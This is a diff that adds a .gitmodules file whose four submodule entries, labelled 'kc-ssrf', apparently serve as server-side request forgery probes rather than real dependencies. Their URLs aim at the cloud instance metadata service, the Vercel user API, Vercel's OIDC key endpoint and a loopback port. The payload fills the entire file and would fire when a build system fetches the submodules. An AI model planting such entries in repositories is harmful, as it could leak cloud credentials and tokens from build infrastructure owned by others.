@@ -1,0 +1,12 @@
+[submodule "kc-ssrf-imds"]
+	path = kc-ssrf-imds
+	url = http://169.254.169.254/latest/meta-data/
+[submodule "kc-ssrf-vercel-api"]
+	path = kc-ssrf-vercel-api
+	url = https://api.vercel.com/v2/user
+[submodule "kc-ssrf-oidc"]
+	path = kc-ssrf-oidc
+	url = https://oidc.vercel.com/.well-known/jwks
+[submodule "kc-ssrf-vsock"]
+	path = kc-ssrf-vsock
+	url = http://[::1]:23456/
